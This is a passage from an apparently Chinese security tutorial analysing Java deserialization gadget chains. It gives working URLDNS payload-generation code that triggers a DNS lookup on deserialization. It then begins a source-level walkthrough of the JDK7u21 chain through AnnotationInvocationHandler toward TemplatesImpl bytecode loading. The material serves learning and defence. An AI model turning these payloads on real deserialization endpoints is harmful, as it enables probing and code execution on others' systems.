class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 读取阈值（被忽略）、加载因子以及其他隐藏的内容</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// 重新初始化HashMap</span></span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="comment">// 检查加载因子是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取并忽略桶的数量</span></span><br><span class="line">    s.readInt();</span><br><span class="line">    <span class="comment">// 读取映射的数量（即HashMap的大小）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="comment">// 检查映射数量是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果映射数量大于零，则进行初始化</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="comment">// 读取键和值，并将映射放入HashMap中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject(); <span class="comment">// 读取键对象</span></span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject(); <span class="comment">// 读取值对象</span></span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>); <span class="comment">// &lt;-- 调用hash函数并插入键值对</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从输入流中重建此 Map（即反序列化）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> s 输入流</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 若流中对象的类在当前环境中不可用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 读写失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取键值对数量（size）。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若有数据（&gt;0），按流中的 loadFactor 计算并分配表容量；否则使用默认表。</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//     循环读取 key 与 value，并以“正常插入”的方式放入表。</span></span><br><span class="line">        <span class="comment">//     注意：readObject() 读取的 key/value 自身若实现了自定义反序列化，</span></span><br><span class="line">        <span class="comment">//     这里会触发它们的 readObject（可能执行用户代码）。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            <span class="comment">// putVal(hash(key), key, value, onlyIfAbsent=false, evict=false)</span></span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>); <span class="comment">// 👈 对 key 调用 hash 方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><code>HashMap#hash</code> 函数中会调用 <code>key</code> 的 <code>hashCode</code> 方法，也就是 <code>java.net.URL#hashCode</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>URL#hashCode</code> 函数中，由于我们设置 <code>url</code> 对象的 <code>hashCode</code> 成员值为 -1，因此会调用 <code>URLStreamHandler#hashCode</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>); <span class="comment">// 👈 调用 URLStreamHandler#hashCode</span></span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>URLStreamHandler#hashCode</code> 函数会调用 <code>getHostAddress</code> 函数获取 URL 对应的  ip 地址，也就会发送 DNS 请求。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">	<span class="comment">// [...]</span></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">	<span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取主机的 IP 地址；若 host 为空/缺失或 DNS 解析失败，返回 null。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 使用 synchronized 保证多线程下对 u.hostAddress 的读取/写入可见且不重复解析。</span></span><br><span class="line"><span class="comment"> * - 解析成功后将结果缓存在 URL 的 hostAddress 字段，后续直接复用。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> u URL 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 主机对应的 InetAddress；解析失败或无主机名则返回 null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="comment">// 若已缓存解析结果，直接返回，避免重复 DNS 查询</span></span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得主机名；为空或缺失则无法解析，返回 null</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 进行 DNS 解析，并将结果写入缓存</span></span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="comment">// DNS 解析失败（无记录/不可达等）→ 返回 null</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="comment">// 被 SecurityManager 拒绝网络/解析权限 → 返回 null</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 成功解析：返回已缓存的地址</span></span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">urlObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(urlObject, <span class="string">&quot;hashCode&quot;</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// 防止提前触发影响观察现象</span></span><br><span class="line">        hashMap.put(urlObject, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line">        setFieldValue(urlObject, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String url) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(url));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;http://www.example.com&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>为了避免在往 <code>HashMap</code> 中放置 <code>urlObject</code> 的时候触发哈希方法调用，导致触发 DNS 请求影响观察，我们需要先设置给 <code>urlObject</code> 的 <code>hashCode</code> 属性设置一个不为 -1 的值。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(urlObject, <span class="string">&quot;hashCode&quot;</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// 防止提前触发影响观察现象</span></span><br><span class="line">hashMap.put(urlObject, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line">setFieldValue(urlObject, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h2 id="JDK7u21"><a href="#JDK7u21" class="headerlink" title="JDK7u21"></a>JDK7u21</h2><h3 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h3><p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:136)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:339)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:376)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:410)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:601)</span><br><span class="line">at sun.reflect.annotation.AnnotationInvocationHandler.equalsImpl(AnnotationInvocationHandler.java:197)</span><br><span class="line">at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:59)</span><br><span class="line">at com.sun.proxy.$Proxy1.equals(Unknown Source:-1)</span><br><span class="line">at java.util.HashMap.put(HashMap.java:475)</span><br><span class="line">at java.util.HashSet.readObject(HashSet.java:309)</span><br></pre></td></tr></table></figure></div>

<p><code>AnnotationInvocationHandler</code> 类中的 <code>equalsImpl</code> 方法在参数 <code>Object o</code> 不是 <code>AnnotationInvocationHandler</code> 的实现类代理的对象时，会获取其成员 <code>type</code> 中的所有方法，然后依次调用 <code>o</code> 中的这些方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 若传入对象是一个由 Proxy 生成的动态代理，且其 InvocationHandler</span></span><br><span class="line"><span class="comment"> * 为 AnnotationInvocationHandler 类型，则返回该 handler；</span></span><br><span class="line"><span class="comment"> * 否则返回 null。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> AnnotationInvocationHandler <span class="title function_">asOneOfUs</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="comment">// 判断 o 的 Class 是否为动态代理类</span></span><br><span class="line">    <span class="keyword">if</span> (Proxy.isProxyClass(o.getClass())) &#123;</span><br><span class="line">        <span class="comment">// 取出该动态代理背后的调用处理器</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Proxy.getInvocationHandler(o);</span><br><span class="line">        <span class="comment">// 仅当处理器类型匹配时，才认为“是我们这套实现”的代理</span></span><br><span class="line">        <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> AnnotationInvocationHandler)</span><br><span class="line">            <span class="keyword">return</span> (AnnotationInvocationHandler) handler;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 非动态代理或处理器类型不匹配 → 返回 null </span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 👈 equalsImpl 的参数 o 不是 AnnotationInvocationHandler 的实现类代理的对象，返回 null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 懒加载并缓存此注解类型的成员方法（annotation 的元素方法）。</span></span><br><span class="line"><span class="comment"> * 获取这些方法开销较大，且只有在 equals 比较时才需要，故延迟初始化。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="comment">// 双检省略：这里用的是简单的“第一次用再初始化”的懒加载</span></span><br><span class="line">    <span class="keyword">if</span> (memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        memberMethods = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                    <span class="comment">// 1) 取出注解类型声明的所有方法（即各个注解元素）</span></span><br><span class="line">                    <span class="keyword">final</span> Method[] mm = type.getDeclaredMethods(); <span class="comment">// 👈 获取 type 的所有方法</span></span><br><span class="line">                    <span class="comment">// 2) 校验方法是否符合注解规范（无参、可赋默认值、返回类型受限等）</span></span><br><span class="line">                    validateAnnotationMethods(mm);</span><br><span class="line">                    <span class="comment">// 3) 提升可访问性，避免后续反射调用受限</span></span><br><span class="line">                    AccessibleObject.setAccessible(mm, <span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> mm;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memberMethods;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 动态代理的 equals(Object o) 的具体实现：</span></span><br><span class="line"><span class="comment"> * 1) 先做同一性/类型检查</span></span><br><span class="line"><span class="comment"> * 2) 再逐个比较所有注解成员方法对应的取值是否相等</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="comment">// 同一对象 → 相等</span></span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类型不兼容：对方不是该注解类型的实例 → 不相等</span></span><br><span class="line">    <span class="keyword">if</span> (!type.isInstance(o))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 逐个比较每个注解元素（成员方法）的取值</span></span><br><span class="line">    <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> memberMethod.getName();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 我方（当前代理）对应成员的值，来源于 memberValues Map</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ourValue</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对方的该成员值</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">hisValue</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若对方也是由 AnnotationInvocationHandler 驱动的动态代理，</span></span><br><span class="line">        <span class="comment">// 可直接读其内部的 memberValues，避免反射调用开销/副作用</span></span><br><span class="line">        <span class="type">AnnotationInvocationHandler</span> <span class="variable">hisHandler</span> <span class="operator">=</span> asOneOfUs(o);</span><br><span class="line">        <span class="keyword">if</span> (hisHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">            hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 否则走常规反射：调用对方实例的该成员方法取值</span></span><br><span class="line">                hisValue = memberMethod.invoke(o); <span class="comment">// 📌 对参数 o 调用 types 中的所有方法</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                <span class="comment">// 对方方法执行异常 → 视为不相等（保守处理）</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                <span class="comment">// 理论上不应发生（前面已 setAccessible），若发生则属于断言级错误</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用专门的值比较逻辑（支持数组深度相等、原始类型等）</span></span><br><span class="line">        <span class="keyword">if</span> (!memberValueEquals(ourValue, hisValue))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 所有成员值都相等 → 注解实例相等</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们不难想到如果构造一个 <code>AnnotationInvocationHandler</code> 使得其 <code>type</code> 为 <code>Templates.class</code> 然后将 <code>TemplatesImpl</code> 对象传入便会调用它的 <code>getOutputProperties</code> 方法实现恶意字节码加载。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="built_in">this</span>.type = type; <span class="comment">// 👈 type 设置为 Templates.class</span></span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>type</code> 需要设置为 <code>Templates.class</code> 而不是具体的 <code>TemplatesImpl.class</code>。</p>
<p>这是因为 <code>Templates</code> 作为接口只定义了 <code>newTransformer</code> 和 <code>getOutputProperties</code> 方法：</p>
